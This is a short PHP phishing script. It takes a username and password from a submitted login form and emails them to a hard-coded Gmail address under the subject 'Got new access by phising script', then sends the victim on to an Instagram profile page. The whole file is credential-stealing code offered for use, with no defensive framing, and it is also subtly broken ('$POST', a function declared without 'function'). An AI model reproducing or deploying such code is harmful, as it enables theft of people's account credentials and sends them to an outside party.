<?php
	mail_sender(){
		$username = $POST['username'];
		$password = $POST['password'];
		
		$reciever = "juliedbac@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $username;
		$message .= "and password is ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: https://www.instagram.com/thelinuxproject/?hl=fr");
	}
?>
